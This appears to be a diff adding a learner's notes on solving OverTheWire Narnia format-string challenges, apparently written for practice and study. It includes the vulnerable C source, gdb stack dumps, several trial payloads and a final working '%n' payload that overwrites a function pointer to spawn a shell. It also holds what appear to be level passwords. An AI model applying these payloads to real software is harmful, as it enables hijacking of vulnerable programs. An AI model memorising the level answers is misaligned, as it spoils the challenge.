@@ -1,0 +1,299 @@
+Previous key: ahkiaziphu
+
+/*
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int goodfunction();
+int hackedfunction();
+
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+  
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+int main(int argc, char **argv){
+        if (argc <= 1){
+                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+                exit(-1);
+        }
+        exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+        fflush(stdout);
+        
+        return 0;
+}
+
+int hackedfunction(){
+        printf("Way to go!!!!");
+	fflush(stdout);
+        system("/bin/sh");
+
+        return 0;
+}
+
+Testing it out with ./narnia7 `python -c "print 'A'*240"` gave no error, so it can handle the extra input.
+
+./narnia7 %p%p%p%p%p%p%n got me a wonderful segfault.
+
+goodfunction() = 0x804866f
+hackedfunction() = 0x8048695
+
+before : ptrf() = 0x804866f (0xffffd69c)
+
+Given this, I really only need to change one byte.
+
+./narnia7 `python -c "print '\x9c\xd6\xff\xff' + '%94x.' + '%n'"`
+
+For gdb: `python -c "print '\x7c\xd6\xff\xff' + '%94x.' + '%n'"`
+
+Hm, this is odd. The %n doesn't write to 0xffffd67c.
+
+The issue that this causes is there now is a segmentation fault at vfprintf+16585 where it tries to write edi (0x63 or 99) into DWORD PTR[1].
+
+This does tell me the value that I'm writing, which is good, because I need to make that last one 0x95, so let me update that input now:
+
+`python -c "print '\x7c\xd6\xff\xff' + '%144x.' + '%n'"`
+
+The next thing is figuring out why eax is 1 at that point way out in vfprintf because it tries to write to eax and it can't write to address 0x1
+
+If I replace those values with the write data from Narnia5 (making it `python -c "print '\x7c\xd6\xff\xff' + '%08x.'*8 + '%n'"`) then eax is 0x3030302e which is...different. It means 000. which seems to correspond to the 08x.
+
+If I make it %99x.*8 then it is 0x20202020 which is a lot of spaces.
+
+This is with %100x.*8:
+(gdb) x/200wx $ecx-0x40
+0xffffd61c: 0xffffd63c  0xffffd650  0xf7ffd918  0xffffd650
+0xffffd62c: 0x0804860b  0xffffd650  0x00000080  0xffffd8cd
+0xffffd63c: 0xf7fd22e8  0x00000001  0x00000000  0x00000001
+0xffffd64c: 0x0804866f  0xffffd67c  0x20202020  0x20202020
+0xffffd65c: 0x20202020  0x20202020  0x20202020  0x20202020
+0xffffd66c: 0x20202020  0x20202020  0x20202020  0x20202020
+0xffffd67c: 0x20202020  0x20202020  0x20202020  0x20202020
+0xffffd68c: 0x20202020  0x20202020  0x20202020  0x20202020
+0xffffd69c: 0x20202020  0x20202020  0x20202020  0x20202020
+0xffffd6ac: 0x20202020  0x64663766  0x38653232  0x2020202e
+0xffffd6bc: 0x20202020  0x20202020  0x20202020  0x20202020
+0xffffd6cc: 0x00202020  0xf7fcdff4  0x00000000  0xffffd6f8
+0xffffd6dc: 0x08048667  0xffffd8cd  0x00000000  0x080486d9
+0xffffd6ec: 0xf7fcdff4  0x080486d0  0x00000000  0x00000000
+0xffffd6fc: 0xf7e444b3  0x00000002  0xffffd794  0xffffd7a0
+0xffffd70c: 0xf7fd2000  0x00000000  0xffffd71c  0xffffd7a0
+0xffffd71c: 0x00000000  0x08048298  0xf7fcdff4  0x00000000
+0xffffd72c: 0x00000000  0x00000000  0xa698e4e8  0x91be00f8
+0xffffd73c: 0x00000000  0x00000000  0x00000000  0x00000002
+0xffffd74c: 0x080484a0  0x00000000  0xf7ff0a90  0xf7e443c9
+
+And with %08x.*8:
+(gdb) x/200wx $ecx-0x40
+0xffffd61c: 0xffffd63c  0xffffd650  0xf7ffd918  0xffffd650
+0xffffd62c: 0x0804860b  0xffffd650  0x00000080  0xffffd8d5
+0xffffd63c: 0xf7fd22e8  0x00000001  0x00000000  0x00000001
+0xffffd64c: 0x0804866f  0xffffd67c  0x64663766  0x38653232
+0xffffd65c: 0x3030302e  0x30303030  0x30302e31  0x30303030
+0xffffd66c: 0x302e3030  0x30303030  0x2e313030  0x34303830
+0xffffd67c: 0x66363638  0x6666662e  0x37366466  0x34362e63
+0xffffd68c: 0x37333636  0x332e3636  0x33353638  0x2e323332
+0xffffd69c: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd6ac: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd6bc: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd6cc: 0x00000000  0xf7fcdff4  0x00000000  0xffffd6f8
+0xffffd6dc: 0x08048667  0xffffd8d5  0x00000000  0x080486d9
+0xffffd6ec: 0xf7fcdff4  0x080486d0  0x00000000  0x00000000
+0xffffd6fc: 0xf7e444b3  0x00000002  0xffffd794  0xffffd7a0
+0xffffd70c: 0xf7fd2000  0x00000000  0xffffd71c  0xffffd7a0
+0xffffd71c: 0x00000000  0x08048298  0xf7fcdff4  0x00000000
+0xffffd72c: 0x00000000  0x00000000  0xe3960e2b  0xd4b0ea3b
+0xffffd73c: 0x00000000  0x00000000  0x00000000  0x00000002
+0xffffd74c: 0x080484a0  0x00000000  0xf7ff0a90  0xf7e443c9
+
+Checking the stack pointers before the function call shows that this is ecx (which is what loads edi and points to 0xffffd65c) is within vuln's stack frame.
+
+Before the call, that area is 0:
+(gdb) x/200wx $esp
+0xffffd630: 0xffffd650  0x00000080  0xffffd8d5  0xf7fd22e8
+0xffffd640: 0x00000001  0x00000000  0x00000001  0x0804866f
+0xffffd650: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd660: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd670: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd680: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd690: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd6a0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd6b0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd6c0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd6d0: 0xf7fcdff4  0x00000000  0xffffd6f8  0x08048667
+0xffffd6e0: 0xffffd8d5  0x00000000  0x080486d9  0xf7fcdff4
+
+But 0xffffd650 is the buffer added to snprintf.
+
+Oh hey, if I use the `python -c "print '\x7c\xd6\xff\xff' + '%144x.' + '%n'"` and check the stack the value at 0xffffd67c is 1.
+
+Perhaps later I will ask something along the lines of the following to reddit:
+
+====================
+
+Title: Segmentation fault in format string exploit, program tries to write to address 0x1?
+
+Text:
+
+So I have a format string exploitation challenge where all I want to do is overwrite a single byte which is part of a pointer. I have done something similar before (OverTheWire, Narnia5):
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+ 
+int main(int argc, char **argv){
+    int i = 1;
+    char buffer[64];
+
+    snprintf(buffer, sizeof buffer, argv[1]);
+    buffer[sizeof (buffer) - 1] = 0;
+    printf("Change i's value from 1 -> 500. ");
+
+    if(i==500){
+        printf("GOOD\n");
+        system("/bin/sh");
+    }
+
+    printf("No way...let me give you a hint!\n");
+    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+    printf ("i = %d (%p)\n", i, &i);
+    return 0;
+}
+
+Spoiler: Solution was to run with `python -c "print '\x0c\xd7\xff\xff' + '%61x.'*8 + '%n'"`
+
+Here is the current challenge (OverTheWire, Narnia8):
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int goodfunction();
+int hackedfunction();
+
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+  
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+int main(int argc, char **argv){
+        if (argc <= 1){
+                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+                exit(-1);
+        }
+        exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+        fflush(stdout);
+        
+        return 0;
+}
+
+int hackedfunction(){
+        printf("Way to go!!!!");
+    fflush(stdout);
+        system("/bin/sh");
+
+        return 0;
+}
+
+Note:
+goodfunction() = 0x804866f
+hackedfunction() = 0x8048695
+
+When I try to run it using something similar (in this case I am trying it with `python -c "print '\x7c\xd6\xff\xff' + '%144x.' + '%n'"` to overwrite the last byte of ptrf to make it hackedfunction), I get a segmentation fault and I can't seem to figure out why. The general exploit format is the same and everything, but I get a segmentation fault at vfprintf+16585 because it tries to write 0x95 to DWORD PTR[0x1].
+
+Here are the instructions at the segmentation fault:
+   0xf7e718f9 <vfprintf+16553>: cmp    DWORD PTR [ebp-0x504],0x0
+   0xf7e71900 <vfprintf+16560>: jne    0xf7e71981 <vfprintf+16689>
+   0xf7e71902 <vfprintf+16562>: mov    ecx,DWORD PTR [ebp+0x10]
+   0xf7e71905 <vfprintf+16565>: mov    edi,DWORD PTR [ebp-0x490]
+   0xf7e7190b <vfprintf+16571>: add    ecx,0x4
+   0xf7e7190e <vfprintf+16574>: mov    DWORD PTR [ebp-0x4f0],ecx
+   0xf7e71914 <vfprintf+16580>: mov    ecx,DWORD PTR [ebp+0x10]
+   0xf7e71917 <vfprintf+16583>: mov    eax,DWORD PTR [ecx]
+=> 0xf7e71919 <vfprintf+16585>: mov    DWORD PTR [eax],edi
+
+I'm honestly not sure where to go from here to figure out what went wrong, but if it's any help, then by changing it to `python -c "print '\x7c\xd6\xff\xff' + '%08x.'*8 + '%n'"`, eax becomes 0x3030302e (in ascii, 000.) and if it's changed to `python -c "print '\x7c\xd6\xff\xff' + '%08x.'*8 + '%n'"`, eax becomes 0x30303030 (0000).
+
+====================
+
+I figure I'll go back and try out some new stuff though.
+
+Back in narnia5 I start messing with inputs. By taking another method I found through an explanation on another site somewhere (URL at bottom), I was able to get the exploit using ./narnia5 `python -c 'print "\x2c\xd7\xff\xff%496x%9$n"'`
+
+On a whim I think the issue was I was attempting to overwrite a byte with a word or dword pointer.
+
+Nope, turns out it was that I had the wrong parameter this whole time (the number of %x's was off which was fixed using %6$n) AND there was a different segfault in the mix so I wasn't getting anything else. (Note from one month later: What on earth was that? Was it a misaligned address?)
+
+run `python -c 'print "\x7c\xd6\xff\xff%145x%6$n"'` worked better, but it was calling to 0x95. No thanks, I want to only overwrite that one byte.
+
+So I guess that means I should be overwriting the whole thing with some large value.
+
+I know from previous things I've looked at that I shouldn't be overwriting the whole doubleword in one go but let's see what happens if I try to.
+
+Oh hey, it worked!
+
+./narnia7 `python -c 'print "\x6c\xd6\xff\xff%134514321x%6$n"'`
+
+Now all that aside I will paste this link here for an explanation on how to more efficiently do it in case I need it in the future:
+http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
+
+^That thing right there is the best explanation I've had so far.
+
+mohthuphog
